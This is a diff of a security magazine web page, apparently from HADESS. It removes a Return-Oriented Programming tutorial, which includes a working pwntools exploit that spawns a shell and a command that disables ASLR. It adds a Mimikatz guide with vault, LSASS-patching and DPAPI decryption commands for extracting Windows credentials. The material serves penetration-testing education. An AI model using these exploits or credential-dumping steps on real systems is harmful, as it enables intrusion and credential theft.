@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1222,7 +1234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/mimikatz-comprehensive-guide#article","headline":"Mimikatz Comprehensive Guide — HADESS Magazine","description":"In the ever-evolving landscape of cybersecurity, the tools and techniques employed by both defenders and attackers are constantly advancing. Among the myriad...","url":"https://hadesssecurity.github.io/blog/read/mimikatz-comprehensive-guide","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/mimikatz-comprehensive-guide"},"datePublished":"June 7, 2024","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2024/06/mimikatz-book.jpg"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/mimikatz-comprehensive-guide#article","headline":"Mimikatz Comprehensive Guide — HADESS Magazine","description":"In the ever-evolving landscape of cybersecurity, the tools and techniques employed by both defenders and attackers are constantly advancing. Among the myriad...","url":"https://hadesssecurity.github.io/blog/read/mimikatz-comprehensive-guide","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/mimikatz-comprehensive-guide"},"datePublished":"June 7, 2024","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2024/06/mimikatz-book.jpg"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1275,14 +1287,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1300,16 +1311,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1326,8 +1337,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1539,1464 +1550,2100 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2024/06/mimikatz-book.jpg">
       
-<p class="wp-block-paragraph">&#8220;ROP Gadget Unleashed&#8221; delves into the intricacies of Return-Oriented Programming (ROP) and its significance in modern exploitation techniques. The article elucidates how attackers leverage existing code snippets, or &#8220;gadgets,&#8221; within a program&#8217;s memory to craft malicious payloads, thus circumventing traditional security mechanisms like Data Execution Prevention (DEP). By chaining these gadgets together, which typically end with a return instruction, adversaries can create a controlled flow of execution that leads to the desired exploit without the need to inject new code. This methodology has emerged as a potent technique for attackers, especially in environments where direct code injection is heavily mitigated.</p>
+<p class="wp-block-paragraph">In the ever-evolving landscape of cybersecurity, the tools and techniques employed by both defenders and attackers are constantly advancing. Among the myriad of tools available, Mimikatz stands out as a particularly powerful and versatile utility that has become a staple in the arsenals of both security professionals and malicious actors. Developed by Benjamin Delpy, Mimikatz has earned a reputation for its ability to extract plaintext passwords, hash, PIN codes, and Kerberos tickets from memory, making it an invaluable resource for understanding and addressing credential theft and privilege escalation in Windows environments.</p>
 
 
 
-<p class="wp-block-paragraph">The article also highlights the importance of identifying and utilizing effective ROP gadgets in penetration testing and exploit development. It discusses various tools and techniques that can be employed to discover ROP gadgets within binary files, emphasizing the necessity of understanding both the architecture and the underlying assembly language of the target application. Furthermore, &#8220;ROP Gadget Unleashed&#8221; underscores the ongoing arms race between security researchers and attackers, showcasing how the development of robust countermeasures against ROP exploits is crucial for maintaining secure systems. By equipping practitioners with knowledge and practical strategies, the article aims to enhance their ability to protect applications against this sophisticated attack vector.</p>
+<p class="wp-block-paragraph">&#8220;Mastering Mimikatz: A Comprehensive Guide&#8221; aims to demystify this potent tool by providing a thorough exploration of its functionalities, practical applications, and the underlying principles that make it effective. Whether you are a seasoned penetration tester, a system administrator seeking to bolster your defenses, or a cybersecurity enthusiast eager to deepen your knowledge, this book offers a detailed roadmap to harnessing the power of Mimikatz responsibly and effectively.</p>
 
 
 
-<h1 class="wp-block-heading">Overview of Return-Oriented Programming (ROP)</h1>
+<p class="wp-block-paragraph">We begin by delving into the history and evolution of Mimikatz, tracing its development from a simple password extraction tool to a multifaceted suite capable of advanced operations. The book then guides readers through the installation and configuration of Mimikatz, ensuring a solid foundation before progressing to more complex topics.</p>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is an advanced exploitation technique that allows attackers to execute code in the presence of security measures like stack canaries and non-executable memory. Instead of injecting malicious code, ROP chains together existing code snippets—called &#8220;gadgets&#8221;—found in a program&#8217;s memory. This method emerged in the mid-2000s, notably highlighted by researchers demonstrating its efficacy against defenses like DEP (Data Execution Prevention). As exploits evolved, ROP became a crucial tool for attackers, enabling them to manipulate program control flow without directly executing injected payloads, thus bypassing many traditional security mechanisms.</p>
+<h2 class="wp-block-heading">The Standard Credential Extraction</h2>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is a sophisticated exploitation technique used to bypass modern security defenses like Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR). Instead of injecting malicious code, ROP reuses existing code snippets, called <strong>gadgets</strong>, found within the memory of a vulnerable program. Gadgets are small sequences of instructions that end in a <code>ret</code> instruction, allowing the attacker to chain them together and control program execution.</p>
+<p class="wp-block-paragraph">Mimikatz simplifies the process of extracting credentials from a Windows system using a straightforward command: <code>vault::cred</code>. This command retrieves stored credentials from the Windows Vault, which is used to store sensitive data such as passwords and authentication tokens. Let&#8217;s explore how this command works and its typical output.</p>
 
 
 
-<h4 class="wp-block-heading">Step-by-Step ROP Attack Example</h4>
+<h3 class="wp-block-heading">Basic Command Usage</h3>
 
 
 
-<p class="wp-block-paragraph">Below is a detailed explanation of how to construct a ROP chain in a vulnerable program, along with essential commands and code snippets to help guide you through a basic ROP exploit.</p>
+<p class="wp-block-paragraph">To extract credentials using Mimikatz, the command is as follows:</p>
 
 
 
-<h5 class="wp-block-heading">1. Disable ASLR (for easier exploitation in practice)</h5>
+<pre class="wp-block-code"><code>mimikatz # vault::cred</code></pre>
 
 
 
-<p class="wp-block-paragraph">In many exploit development scenarios, ASLR (Address Space Layout Randomization) can make exploitation harder. You can disable it temporarily using the following command:</p>
+<p class="wp-block-paragraph">When executed, this command might produce output similar to the following:</p>
 
 
 
-<pre class="wp-block-code"><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
+<pre class="wp-block-code"><code>TargetName : genaddr / &lt;NULL&gt;
+UserName   : genuser
+Comment    : &lt;NULL&gt;
+Type       : 1 - generic
+Persist    : 3 - enterprise
+Flags      : 00000000
+Credential : genpass
+Attributes : 0
 
+TargetName : domsrv / &lt;NULL&gt;
+UserName   : domusr
+Comment    : &lt;NULL&gt;
+Type       : 2 - domain_password
+Persist    : 3 - enterprise
+Flags      : 00000000
+Credential :
+Attributes : 0
 
+TargetName : LegacyGeneric:target=genaddr / &lt;NULL&gt;
+UserName   : genuser
+Comment    : &lt;NULL&gt;
+Type       : 1 - generic
+Persist    : 3 - enterprise
+Flags      : 00000000
+Credential : genpass
+Attributes : 0
 
-<h5 class="wp-block-heading">2. Find Dependencies and Libraries</h5>
+TargetName : Domain:target=domsrv / &lt;NULL&gt;
+UserName   : domusr
+Comment    : &lt;NULL&gt;
+Type       : 2 - domain_password
+Persist    : 3 - enterprise
+Flags      : 00000000
+Credential :
+Attributes : 0</code></pre>
 
 
 
-<p class="wp-block-paragraph">Use the <code>ldd</code> command to inspect the shared libraries used by the vulnerable binary. This helps you identify where libc or other shared libraries are located in memory.</p>
-
-
-
-<pre class="wp-block-code"><code>$ ldd vuln-32
-    linux-gate.so.1 (0xf7fd2000)
-    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dc2000)   # Important: we will use libc later
-    /lib/ld-linux.so.2 (0xf7fd3000)</code></pre>
-
-
-
-<h5 class="wp-block-heading">3. Locate Gadgets Using ROPgadget</h5>
-
-
-
-<p class="wp-block-paragraph">The core of any ROP exploit is finding gadgets. These are small chunks of code that perform useful operations (like loading a register or calling a function). For instance, a common gadget is <code>pop rdi; ret</code>, which allows the attacker to set up a function argument before a call to a function like <code>system()</code>.</p>
-
-
-
-<p class="wp-block-paragraph">Install and use ROPgadget to find usable gadgets in the binary:</p>
-
-
-
-<pre class="wp-block-code"><code>$ ROPgadget --binary vuln-64 | grep rdi
-0x00000000004011cb : pop rdi ; ret</code></pre>
-
-
-
-<p class="wp-block-paragraph">The above command shows that we have found a useful gadget: <code>pop rdi; ret</code> at the address <code>0x4011cb</code>. This gadget will allow us to set up the first argument (RDI register) before calling <code>system()</code>.</p>
-
-
-
-<h5 class="wp-block-heading">4. Find System and &#8220;/bin/sh&#8221; Strings in libc</h5>
-
-
-
-<p class="wp-block-paragraph">Next, we need to find the address of the <code>system()</code> function and the <code>/bin/sh</code> string in libc, which are critical for executing a shell.</p>
-
-
-
-<p class="wp-block-paragraph">To find <code>system()</code>:</p>
-
-
-
-<pre class="wp-block-code"><code>$ readelf -s /lib32/libc.so.6 | grep system
-   1463: 0003cd10   88 FUNC    GLOBAL DEFAULT   13 system</code></pre>
-
-
-
-<p class="wp-block-paragraph">To find the <code>/bin/sh</code> string:</p>
-
-
-
-<pre class="wp-block-code"><code>$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
-   18a143 /bin/sh</code></pre>
-
-
-
-<h5 class="wp-block-heading">5. Create the ROP Chain</h5>
-
-
-
-<p class="wp-block-paragraph">Using the gadgets and addresses we found, we can now build the ROP chain that will exploit the vulnerable program and give us a shell.</p>
-
-
-
-<p class="wp-block-paragraph">Here’s the full Python exploit script using <code>pwntools</code>:</p>
-
-
-
-<pre class="wp-block-code"><code>from pwn import *
-
-# Start the vulnerable process
-p = process('./vuln-64')
-
-# Base address of libc (can be found or leaked in real-world scenarios)
-libc_base = 0x7ffff7de5000
-system = libc_base + 0x48e20     # Address of system() in libc
-binsh = libc_base + 0x18a143     # Address of "/bin/sh" string in libc
-
-# ROP gadget addresses
-POP_RDI = 0x4011cb  # Address of pop rdi; ret gadget
-
-# Constructing the payload
-payload = b'A' * 72         # Padding to reach return address
-payload += p64(POP_RDI)     # Gadget to set up the RDI register
-payload += p64(binsh)       # Pointer to the "/bin/sh" string
-payload += p64(system)      # Address of system() to call system("/bin/sh")
-payload += p64(0x0)         # Return address after system() is called (can be arbitrary)
-
-# Send the payload
-p.clean()
-p.sendline(payload)
-p.interactive()</code></pre>
-
-
-
-<h4 class="wp-block-heading">Breakdown of the Exploit</h4>
+<h3 class="wp-block-heading">Explanation of Output</h3>
 
 
 
 <ul class="wp-block-list">
-<li><strong>Padding</strong>: We use 72 bytes (<code>'A' * 72</code>) to overflow the buffer and reach the return address.</li>
+<li><strong>TargetName</strong>: The name of the target resource or service.</li>
 
 
 
-<li><strong>POP_RDI Gadget</strong>: The <code>pop rdi; ret</code> gadget allows us to control the value of the <code>rdi</code> register (the first argument for system()).</li>
+<li><strong>UserName</strong>: The username associated with the credential.</li>
 
 
 
-<li><strong>/bin/sh</strong>: We pass the <code>/bin/sh</code> string as the first argument to <code>system()</code>.</li>
+<li><strong>Type</strong>: Indicates the type of credential (1 &#8211; generic, 2 &#8211; domain_password).</li>
 
 
 
-<li><strong>System Call</strong>: We call <code>system()</code> with <code>/bin/sh</code>, resulting in spawning a shell.</li>
+<li><strong>Persist</strong>: Describes the persistence level of the credential (3 &#8211; enterprise).</li>
+
+
+
+<li><strong>Flags</strong>: Additional flags associated with the credential.</li>
+
+
+
+<li><strong>Credential</strong>: The actual credential data, such as a password.</li>
 </ul>
 
 
 
-<h5 class="wp-block-heading">6. Running the Exploit</h5>
+<p class="wp-block-paragraph">This output is generated using the standard API <code>CredEnumerate</code> with the <code>CRED_ENUMERATE_ALL_CREDENTIALS</code> flag, which attempts to retrieve all stored credentials.</p>
 
 
 
-<p class="wp-block-paragraph">To test the exploit, compile your vulnerable program and run the Python script:</p>
+<h2 class="wp-block-heading">Using Mimikatz to Extract Web Credentials</h2>
 
 
 
-<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th><strong>Step</strong></th><th><strong>Command</strong></th></tr></thead><tbody><tr><td>Disable ASLR</td><td>`echo 0</td></tr><tr><td>Check shared libraries</td><td><code>ldd vuln-32</code></td></tr><tr><td>Find gadgets</td><td>`ROPgadget &#8211;binary vuln-64</td></tr><tr><td>Find system() in libc</td><td>`readelf -s /lib32/libc.so.6</td></tr><tr><td>Find /bin/sh string</td><td>`strings -a -t x /lib32/libc.so.6</td></tr><tr><td>Compile vulnerable program</td><td><code>gcc -m64 -o vuln-64 vuln-64.c</code></td></tr><tr><td>Exploit using Python script</td><td><code>python3 exploit.py</code></td></tr></tbody></table></figure>
+<p class="wp-block-paragraph">Combining <code>vault::cred</code> with <code>vault::list</code> can yield a comprehensive list of credentials, especially those related to web services. For example:</p>
 
 
 
-<h4 class="wp-block-heading">Significance of ROP in Modern Exploits</h4>
+<pre class="wp-block-code"><code>mimikatz # vault::list</code></pre>
 
 
 
-<p class="wp-block-paragraph">ROP plays a pivotal role in bypassing contemporary security measures by leveraging existing code to create dynamic execution paths, making it difficult for traditional defenses to detect and mitigate. In an era where many systems implement protections like Address Space Layout Randomization (ASLR) and stack canaries, ROP allows attackers to circumvent these barriers by using the program&#8217;s own code against it. For defenders, understanding ROP is essential to developing effective countermeasures and improving the overall security posture. This ongoing cat-and-mouse game underscores the importance of ROP not only as a tool for attackers but also as a critical area of focus for cybersecurity professionals aiming to protect systems from sophisticated exploits.</p>
+<h2 class="wp-block-heading">Working with LSASS and DPAPI</h2>
 
 
 
-<p class="wp-block-paragraph">https://github.com/alanvivona/pwnshop and https://github.com/Rizer0/Ropdump</p>
+<p class="wp-block-paragraph">In some cases, you might need to access network share credentials, RDP passwords, etc., which are stored in LSASS. This requires administrative privileges to alter LSASS.</p>
 
 
 
-<h3 class="wp-block-heading">ROP Gadgets</h3>
+<h3 class="wp-block-heading">Altering LSASS Logic</h3>
 
 
 
-<p class="wp-block-paragraph">ROP gadgets are short sequences of instructions that end with a &#8220;return&#8221; instruction, allowing the control flow to jump to the next gadget in a ROP chain. The purpose of these gadgets is to enable an attacker to construct a payload that can manipulate the program&#8217;s execution flow without injecting any new code, effectively utilizing the existing code within a target application or library. This technique is particularly valuable in scenarios where memory protections are in place, as it allows for exploitation without violating these defenses.</p>
+<p class="wp-block-paragraph">You can use the <code>/patch</code> argument to prevent LSASS from checking the credential type:</p>
 
 
 
-<p class="wp-block-paragraph">Extracting ROP gadgets involves analyzing the binary code of a target application, typically using tools designed for disassembly and reverse engineering. Attackers often employ tools like ROPgadget, Ropper, or custom scripts to scan for sequences of instructions that meet the criteria for gadgets. This process includes identifying potential gadgets by searching through the binary for instructions that lead to a return statement, then cataloging these sequences to facilitate the construction of ROP chains. By carefully selecting and chaining these gadgets, attackers can orchestrate complex exploits tailored to bypass security measures and achieve their objectives.</p>
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::patch</code></pre>
 
 
 
-<h4 class="wp-block-heading">1. <strong>Address Space Layout Randomization (ASLR)</strong></h4>
+<p class="wp-block-paragraph">This approach is risky and generally not recommended. Instead, using the Data Protection API (DPAPI) is a safer method.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Randomizes memory addresses to make exploitation harder.</li>
+<h2 class="wp-block-heading">Extracting Credentials with DPAPI</h2>
 
 
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>Memory leaks can reveal address locations.</li>
+<p class="wp-block-paragraph">DPAPI is a built-in Windows mechanism for protecting data. Credentials are stored in user profiles, typically found in:</p>
 
 
 
-<li>If certain libraries or sections are not fully randomized, ROP gadgets can still be located.</li>
-</ul>
-</li>
-</ul>
+<pre class="wp-block-code"><code>%appdata%\Microsoft\Credentials
+%localappdata%\Microsoft\Credentials</code></pre>
 
 
 
-<h4 class="wp-block-heading">2. <strong>Data Execution Prevention (DEP)</strong></h4>
+<h3 class="wp-block-heading">Example Command</h3>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Marks memory regions (e.g., stack, heap) as non-executable.</li>
+<p class="wp-block-paragraph">To view the content of a credential file:</p>
 
 
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP reuses existing executable code, bypassing the need to inject new code.</li>
-</ul>
-</li>
-</ul>
+<pre class="wp-block-code"><code>mimikatz # dpapi::cred /in:"%appdata%\Microsoft\Credentials\85E671988F9A2D1981A4B6791F9A4EE8"</code></pre>
 
 
 
-<h4 class="wp-block-heading">3. <strong>Stack Canaries</strong></h4>
+<p class="wp-block-paragraph">This command will output details such as:</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Detects buffer overflows by placing a random value before the return address.</li>
+<pre class="wp-block-code"><code>**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {cc6eb538-28f1-4ab4-adf2-f5594e88f0b2}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000050 - 80
+  szDescription      : Données d’identification d’entreprise
+  ...</code></pre>
 
 
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>If the canary is leaked, the attacker can overwrite the return address without detection.</li>
-</ul>
-</li>
-</ul>
+<h3 class="wp-block-heading">Decrypting the Blob</h3>
 
 
 
-<h4 class="wp-block-heading">4. <strong>Control Flow Integrity (CFI)</strong></h4>
+<p class="wp-block-paragraph">If the <code>dwFlags</code> includes <code>CRYPTPROTECT_SYSTEM</code>, the blob is protected by the system and cannot be decrypted by a standard user. The <code>guidMasterKey</code> indicates the necessary master key for decryption.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Ensures the control flow follows valid paths in the program.</li>
+<h3 class="wp-block-heading">Master Key Location</h3>
 
 
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP gadgets can mimic valid control flows, making it difficult for CFI to detect.</li>
-</ul>
-</li>
-</ul>
+<p class="wp-block-paragraph">Master keys are stored in:</p>
 
 
 
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/xct/ropstar
-</div></figure>
+<pre class="wp-block-code"><code>%appdata%\Microsoft\Protect\&lt;usersid&gt;\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2</code></pre>
 
 
 
-<h4 class="wp-block-heading">Types of ROP Gadgets</h4>
+<p class="wp-block-paragraph">To extract the master key:</p>
 
 
 
-<p class="wp-block-paragraph">ROP gadgets can be classified into several types, each serving distinct purposes in an exploit.</p>
+<pre class="wp-block-code"><code>mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1719172562-3308538836-3929312420-1104\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2"</code></pre>
 
 
 
-<p class="wp-block-paragraph">POP Gadgets are fundamental for manipulating the stack and registers, as they typically contain one or more POP instructions that load values from the stack into registers. This is essential for setting up the right context for later operations.</p>
+<h3 class="wp-block-heading">Using RPC for Domain Controllers</h3>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Load values from the stack into registers.</li>
+<p class="wp-block-paragraph">Domain controllers can decrypt master keys for authorized users using the RPC service. To use this feature:</p>
 
 
 
-<li><strong>Example</strong>: <code>pop rdi; ret</code></li>
+<pre class="wp-block-code"><code>mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1719172562-3308538836-3929312420-1104\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2" /rpc</code></pre>
 
 
 
-<li><strong>Usage</strong>: Essential for setting up parameters before function calls.</li>
-</ul>
+<h3 class="wp-block-heading">Final Decryption</h3>
 
 
 
-<p class="wp-block-paragraph">RET Gadgets are the simplest form of gadgets, consisting of just a RET instruction. They serve to redirect control flow, allowing the execution to jump to the next gadget in a chain, thereby maintaining the sequence of operations.</p>
+<p class="wp-block-paragraph">With the master key in Mimikatz&#8217;s cache, decrypt the credential file again:</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Control flow redirection using <code>ret</code> instructions.</li>
+<pre class="wp-block-code"><code>mimikatz # dpapi::cred /in:"%appdata%\Microsoft\Credentials\85E671988F9A2D1981A4B6791F9A4EE8"</code></pre>
 
 
 
-<li><strong>Usage</strong>: Used to jump to the next gadget in a chain, ensuring the sequence of operations.</li>
-</ul>
+<p class="wp-block-paragraph">The output will include decrypted credentials:</p>
 
 
 
-<p class="wp-block-paragraph">MOV Gadgets facilitate data transfer between registers or between registers and memory. By utilizing these gadgets, attackers can efficiently move values needed for calculations or function parameters, crucial for shaping the exploit&#8217;s behavior.</p>
+<pre class="wp-block-code"><code>**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 0000008e - 142
+  ...
+  UserName       : domusr
+  CredentialBlob : dompass
+  ...</code></pre>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Move data between registers or memory.</li>
+<h2 class="wp-block-heading">Decrypt EFS files</h2>
 
 
 
-<li><strong>Usage</strong>: Useful for setting up function arguments or controlling data flow during the exploit.</li>
-</ul>
+<p class="wp-block-paragraph">Decrypting Encrypted File System (EFS) files can be complex, but it&#8217;s manageable with the right tools and knowledge. Here&#8217;s a detailed guide based on Benjamin Delpy&#8217;s work. This guide assumes you have access to the encrypted files on a Windows system and the necessary user data.</p>
 
 
 
-<p class="wp-block-paragraph">Arithmetic Gadgets perform various mathematical operations, including addition, subtraction, multiplication, and division. These gadgets enable dynamic computation of values during the exploit, allowing for more complex manipulations.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Perform arithmetic operations like addition, subtraction, or XOR.</li>
-
-
-
-<li><strong>Usage</strong>: Can dynamically compute values during exploitation.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">Lastly, System Call Gadgets are designed to invoke system calls, enabling the exploit to interact directly with the operating system. This is vital for performing actions like spawning shells or manipulating files, ultimately achieving the attacker’s goals. Together, these gadget types create a versatile toolkit for sophisticated ROP attacks.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Trigger system calls to interact with the operating system (e.g., spawn a shell).</li>
-
-
-
-<li><strong>Usage</strong>: These gadgets are vital for achieving the final goals of an exploit.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">Finding ROP Gadgets</h3>
-
-
-
-<p class="wp-block-paragraph">Several tools help find and chain ROP gadgets:</p>
-
-
-
-<h4 class="wp-block-heading"><strong>ROPgadget.py</strong></h4>
-
-
-
-<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="883" height="960" src="/wp-content/uploads/2024/09/image-10.png" alt="" class="wp-image-8829" srcset="/wp-content/uploads/2024/09/image-10.png 883w, /wp-content/uploads/2024/09/image-10-276x300.png 276w, /wp-content/uploads/2024/09/image-10-768x835.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A Python tool that finds ROP gadgets in binaries across architectures like x86, ARM, and MIPS.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>ROPgadget.py --binary &lt;binary&gt;
-ROPgadget.py --binary &lt;binary&gt; --ropchain</code></pre>
-
-
-
-<h4 class="wp-block-heading"><strong>rp++</strong></h4>
-
-
-
